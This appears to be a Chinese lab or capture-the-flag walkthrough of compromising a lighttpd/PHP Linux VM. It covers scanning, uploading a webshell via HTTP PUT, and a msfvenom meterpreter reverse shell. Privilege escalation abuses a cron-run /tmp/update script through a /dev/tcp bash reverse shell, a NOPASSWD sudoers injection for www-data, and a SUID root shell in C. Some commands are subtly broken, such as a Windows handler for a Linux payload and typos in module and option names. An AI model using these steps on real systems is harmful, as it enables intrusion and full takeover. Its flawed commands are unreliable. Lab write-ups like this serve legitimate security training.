# nmap

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 15:14 CST
Nmap scan report for 192.168.137.145
Host is up (0.00027s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:14:83:BD (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|WAP|phone
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (93%), Google Android 5.X|6.X (87%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:3.18 cpe:/o:linux:linux_kernel:4.1 cpe:/o:google:android:5 cpe:/o:google:android:6 cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.6.32
Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (92%), Linux 4.2 (90%), Linux 3.13 (90%), Linux 3.18 (88%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%), Linux 4.10 (87%), Android 5.0 - 6.0.1 (Linux 3.4) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 192.168.137.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.20 seconds
```

# whatweb

```
 HTTPServer[lighttpd/1.4.28], lighttpd[1.4.28], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP/5.3.10-1ubuntu3.21]
```

```
curl -X OPTION url --v 发现可以在/test目录下进行put提交
put上传一句话木马，但是无法反弹shell，是防火墙对端口进行了限制
```

msfvenom生成后门木马

```
msfvenom -p linux/meterpreter/reverse_tcp lhost=192.168.137.129 lport=443 R>shell.php
```

利用put上传，使用msf模块开启监听

```
use exploit/mutil/handler
set paypload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.137.129
set lport 443
```

成功反弹shell

# 提权

发现定时运行的病毒检查脚本有漏洞，会自动运行/tmp/update文件

在update中写入提权代码即可

### 提权方式一

```
printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.202.6/8080 0>&1\n' > /tmp/update
```

本地监听等待反弹shell

### 提权方式二

将用户权限写入/etc/sudoers

```
echo 'chmod +w /etc/sudoers && echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /tmp/update
```

### 提权方式三

```
#include<unistd.h>
void main(void)
{
system("chown root:root /tmp/update");
system("chmod 4755 /tmp/update");
setuid(0);
setgid(0);
execl("/bin/sh","sh",NULL);
}
```

